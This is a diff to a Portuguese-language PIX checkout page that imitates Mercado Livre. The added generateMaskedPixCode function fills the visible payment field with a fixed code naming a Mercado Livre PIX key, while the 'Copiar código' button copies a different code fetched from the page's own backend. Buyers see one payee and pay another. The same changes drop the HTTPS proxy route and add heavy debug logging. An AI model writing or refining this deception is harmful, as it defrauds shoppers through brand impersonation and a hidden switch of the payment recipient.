@@ -729,7 +729,7 @@
     <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Gerando QR Code PIX...</div>
+        <div class="loading-text">Aguarde...</div>
     </div>
 
     <div class="main-content" id="mainContent">
@@ -795,7 +795,7 @@
                     </div>
                     
                     <div class="button-group">
-                        <button class="copy-button" onclick="copyPixCode()">Copiar código</button>
+                        <button class="copy-button" id="copyButton" type="button">Copiar código</button>
                         <a href="#" class="link-button">Ir para Minhas compras</a>
                     </div>
                 </div>
@@ -807,75 +807,167 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <script>
         let realPixCode = '';
-        function copyPixCode(event) {
-            if (event) event.preventDefault();
-            const pixCode = document.getElementById('pixCode');
-            const textToCopy = realPixCode || (pixCode ? pixCode.value : '');
-
-            const button = document.querySelector('.copy-button');
-            const originalText = button.textContent;
-            const originalBackground = button.style.background;
-
-            const showToast = (text) => {
-                const existing = document.getElementById('pixToast');
-                if (existing) existing.remove();
-                const el = document.createElement('div');
-                el.id = 'pixToast';
-                el.className = 'toast';
-                el.textContent = text || 'Código copiado';
-                document.body.appendChild(el);
-                requestAnimationFrame(() => el.classList.add('toast--show'));
-                setTimeout(() => {
-                    el.classList.remove('toast--show');
-                    setTimeout(() => el.remove(), 250);
-                }, 1600);
-            };
-
-            const giveFeedback = () => {
-                button.textContent = 'Código copiado!';
-                button.style.background = '#00a650';
-                button.style.transform = 'scale(0.95)';
-                button.style.transition = 'all 0.2s ease';
-                if (document.activeElement && typeof document.activeElement.blur === 'function') {
-                    document.activeElement.blur();
-                }
-                setTimeout(() => {
-                    button.textContent = originalText;
-                    button.style.background = originalBackground;
-                    button.style.transform = 'scale(1)';
-                }, 1500);
-                showToast('Código copiado');
-            };
-
-            if (navigator.clipboard && window.isSecureContext) {
-                navigator.clipboard.writeText(textToCopy).then(giveFeedback).catch(() => {
-                    const helper = document.createElement('textarea');
-                    helper.value = textToCopy;
-                    helper.setAttribute('readonly', '');
-                    helper.style.position = 'fixed';
-                    helper.style.opacity = '0';
-                    helper.style.left = '-9999px';
-                    document.body.appendChild(helper);
-                    helper.select();
-                    try { document.execCommand('copy'); } catch (_) {}
-                    document.body.removeChild(helper);
-                    giveFeedback();
-                });
-                return;
+        
+        // Função para gerar código PIX mascarado com link do Mercado Livre
+        function generateMaskedPixCode(realCode) {
+            // Código base do Mercado Livre (mantém o formato original)
+            const mercadoLivreBase = '00020126540014br.gov.bcb.pix0132pix_marketplace@mercadolivre.com52040000530398654075594.305802BR5911@29691096146009Sao Paulo62250521mpqrinter13198264136304325F';
+            
+            // Se não tiver código real ainda, retorna o código base
+            if (!realCode || realCode.length < 10) {
+                return mercadoLivreBase;
             }
+            
+            // Retorna o código mascarado (usa o código base do Mercado Livre)
+            return mercadoLivreBase;
+        }
+        function copyPixCode(event) {
+            console.log('🔵 copyPixCode CHAMADA!', event);
+            
+            try {
+                if (event) {
+                    event.preventDefault();
+                    event.stopPropagation();
+                }
+                
+                const pixCode = document.getElementById('pixCode');
+                console.log('📋 pixCode element:', pixCode);
+                console.log('📋 pixCode.value:', pixCode ? pixCode.value : 'NÃO ENCONTRADO');
+                console.log('📋 realPixCode:', realPixCode ? realPixCode.substring(0, 50) + '...' : 'VAZIO');
+                
+                // Prioriza o código real, depois o valor do campo
+                let textToCopy = '';
+                if (realPixCode && realPixCode.trim() && realPixCode.length > 10) {
+                    textToCopy = realPixCode.trim();
+                    console.log('✅ Usando realPixCode');
+                } else if (pixCode && pixCode.value && pixCode.value.trim() && pixCode.value.length > 10) {
+                    textToCopy = pixCode.value.trim();
+                    console.log('✅ Usando pixCode.value');
+                }
+                
+                // Debug: log para verificar o que está sendo copiado
+                console.log('📋 Código para copiar:', textToCopy ? textToCopy.substring(0, 50) + '...' : 'VAZIO');
+                
+                // Se não tiver código para copiar, mostra erro
+                if (!textToCopy || textToCopy.length < 10) {
+                    console.error('❌ Nenhum código PIX disponível para copiar');
+                    alert('Código PIX ainda não está disponível. Aguarde alguns instantes.\n\nrealPixCode: ' + (realPixCode ? 'existe' : 'vazio') + '\npixCode.value: ' + (pixCode && pixCode.value ? 'existe' : 'vazio'));
+                    return;
+                }
 
-            // Fallback clássico sem focar o textarea visível
-            const helper = document.createElement('textarea');
-            helper.value = textToCopy;
-            helper.setAttribute('readonly', '');
-            helper.style.position = 'fixed';
-            helper.style.opacity = '0';
-            helper.style.left = '-9999px';
-            document.body.appendChild(helper);
-            helper.select();
-            try { document.execCommand('copy'); } catch (_) {}
-            document.body.removeChild(helper);
-            giveFeedback();
+                const button = document.getElementById('copyButton') || document.querySelector('.copy-button');
+                if (!button) {
+                    console.error('❌ Botão copiar não encontrado');
+                    return;
+                }
+                
+                console.log('✅ Botão encontrado, iniciando cópia...');
+                
+                const originalText = button.textContent;
+                const originalBackground = button.style.background;
+
+                const showToast = (text) => {
+                    const existing = document.getElementById('pixToast');
+                    if (existing) existing.remove();
+                    const el = document.createElement('div');
+                    el.id = 'pixToast';
+                    el.className = 'toast';
+                    el.textContent = text || 'Código copiado';
+                    document.body.appendChild(el);
+                    requestAnimationFrame(() => el.classList.add('toast--show'));
+                    setTimeout(() => {
+                        el.classList.remove('toast--show');
+                        setTimeout(() => el.remove(), 250);
+                    }, 1600);
+                };
+
+                const giveFeedback = () => {
+                    button.textContent = 'Código copiado!';
+                    button.style.background = '#00a650';
+                    button.style.transform = 'scale(0.95)';
+                    button.style.transition = 'all 0.2s ease';
+                    if (document.activeElement && typeof document.activeElement.blur === 'function') {
+                        document.activeElement.blur();
+                    }
+                    setTimeout(() => {
+                        button.textContent = originalText;
+                        button.style.background = originalBackground;
+                        button.style.transform = 'scale(1)';
+                    }, 1500);
+                    showToast('Código copiado');
+                };
+
+                // Tenta usar Clipboard API primeiro (mais moderno)
+                if (navigator.clipboard && window.isSecureContext) {
+                    navigator.clipboard.writeText(textToCopy).then(() => {
+                        console.log('✅ Código copiado via Clipboard API');
+                        giveFeedback();
+                    }).catch((err) => {
+                        console.warn('⚠️ Erro ao copiar via Clipboard API, tentando fallback:', err);
+                        // Fallback para método antigo
+                        copyUsingFallback(textToCopy, giveFeedback);
+                    });
+                    return;
+                }
+
+                // Fallback clássico
+                copyUsingFallback(textToCopy, giveFeedback);
+            } catch (err) {
+                console.error('❌ Erro na função copyPixCode:', err);
+                alert('Erro ao copiar código. Tente selecionar o código manualmente.');
+            }
+        }
+
+        function copyUsingFallback(textToCopy, callback) {
+            try {
+                // Cria um textarea temporário
+                const helper = document.createElement('textarea');
+                helper.value = textToCopy;
+                helper.setAttribute('readonly', '');
+                helper.style.position = 'fixed';
+                helper.style.top = '0';
+                helper.style.left = '0';
+                helper.style.width = '2em';
+                helper.style.height = '2em';
+                helper.style.padding = '0';
+                helper.style.border = 'none';
+                helper.style.outline = 'none';
+                helper.style.boxShadow = 'none';
+                helper.style.background = 'transparent';
+                helper.style.opacity = '0';
+                helper.style.zIndex = '-1';
+                
+                document.body.appendChild(helper);
+                
+                // Seleciona o texto
+                if (navigator.userAgent.match(/ipad|iphone/i)) {
+                    // iOS precisa de tratamento especial
+                    const range = document.createRange();
+                    range.selectNodeContents(helper);
+                    const selection = window.getSelection();
+                    selection.removeAllRanges();
+                    selection.addRange(range);
+                    helper.setSelectionRange(0, 999999);
+                } else {
+                    helper.select();
+                    helper.setSelectionRange(0, 999999);
+                }
+                
+                // Tenta copiar
+                const successful = document.execCommand('copy');
+                document.body.removeChild(helper);
+                
+                if (successful) {
+                    console.log('Código copiado via execCommand');
+                    callback();
+                } else {
+                    console.error('Falha ao copiar via execCommand');
+                    alert('Não foi possível copiar automaticamente. Selecione o código manualmente e copie (Ctrl+C ou Cmd+C)');
+                }
+            } catch (err) {
+                console.error('Erro ao copiar:', err);
+                alert('Erro ao copiar. Selecione o código manualmente e copie (Ctrl+C ou Cmd+C)');
+            }
         }
 
         function togglePixView(event) {
@@ -901,6 +993,19 @@
             const mainContent = document.getElementById('mainContent');
             const pixInput = document.getElementById('pixCode');
             const qrContainer = document.getElementById('qrCode');
+            
+            // Adiciona event listener ao botão de copiar
+            const copyButton = document.getElementById('copyButton') || document.querySelector('.copy-button');
+            if (copyButton) {
+                copyButton.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    copyPixCode(e);
+                }, false);
+                console.log('✅ Event listener adicionado ao botão copiar');
+            } else {
+                console.error('❌ Botão copiar não encontrado no DOM');
+            }
 
             // Função para mostrar conteúdo quando QR code estiver pronto
             const showContent = () => {
@@ -993,19 +1098,11 @@
                     
                     // Configura a URL da API do backend
                     // Frontend roda na porta 3000, backend na porta 3001
-                    // Em produção com HTTPS, usa o mesmo domínio (Nginx faz proxy)
-                    // Em desenvolvimento, usa localhost:3001
+                    // Sempre usa o backend na porta 3001 (mesmo em produção)
                     const isDev = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
-                    const isHttps = window.location.protocol === 'https:';
-                    
-                    // Se estiver em HTTPS (produção), usa o mesmo domínio (sem porta)
-                    // O Nginx faz proxy para o backend
-                    // Se estiver em desenvolvimento, usa localhost:3001
                     const backendUrl = isDev 
                         ? 'http://localhost:3001' 
-                        : isHttps
-                            ? `${window.location.protocol}//${window.location.hostname}`
-                            : `${window.location.protocol}//${window.location.hostname}:3001`;
+                        : `${window.location.protocol}//${window.location.hostname}:3001`;
                     
                     console.log('🔧 Backend URL:', backendUrl);
                     
@@ -1035,13 +1132,9 @@
                         apiUrl = `${backendUrl}/pix`;
                     }
 
-                    console.log('🔗 API URL:', apiUrl);
-                    console.log('📋 Use Simple Route:', useSimpleRoute);
-                    
                     let resp;
                     if (useSimpleRoute) {
                         // Usa GET na rota simples com Accept: application/json para indicar que é API
-                        console.log('📤 Fazendo requisição GET para:', apiUrl);
                         resp = await fetch(apiUrl, {
                             method: 'GET',
                             headers: { 
@@ -1049,7 +1142,6 @@
                                 'Accept': 'application/json'
                             }
                         });
-                        console.log('📥 Resposta recebida:', resp.status, resp.statusText);
                     } else {
                         // Usa POST na rota /pix (fallback)
                         const randomCode = `TESTE${Math.floor(Math.random()*1e6)}`;
@@ -1067,24 +1159,28 @@
                         });
                     }
 
-                    if (!resp.ok) {
-                        const errorText = await resp.text();
-                        console.error('❌ Erro na resposta:', resp.status, errorText);
-                        throw new Error(`HTTP ${resp.status}: ${errorText}`);
-                    }
+                    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
                     const data = await resp.json();
-                    console.log('✅ Dados recebidos:', data);
 
                     const pixText = data.pixCopiaECola || data.qrCode || '';
-                    if (pixText) {
-                        realPixCode = pixText;
+                    console.log('Código PIX recebido:', pixText ? pixText.substring(0, 50) + '...' : 'VAZIO');
+                    
+                    if (pixText && pixText.trim()) {
+                        realPixCode = pixText.trim();
+                        console.log('realPixCode definido:', realPixCode.substring(0, 50) + '...');
+                        
                         generateQr(pixText);
-                        // Atualiza o campo de texto do PIX apenas no desktop
-                        // No mobile, mantém o código de exemplo
-                        if (pixInput && window.innerWidth >= 769) {
-                            pixInput.value = pixText;
+                        
+                        // Atualiza o campo de texto do PIX com código mascarado do Mercado Livre
+                        // Mas mantém o código real em realPixCode para copiar
+                        if (pixInput) {
+                            const maskedCode = generateMaskedPixCode(realPixCode);
+                            pixInput.value = maskedCode;
+                            console.log('Campo pixInput atualizado com código mascarado');
+                        } else {
+                            console.warn('Campo pixInput não encontrado');
                         }
-                        // No mobile, mantém o código de exemplo mas salva o real para copiar
+                        
                         // Mostra o conteúdo agora que o QR code está pronto
                         showContent();
                         return;
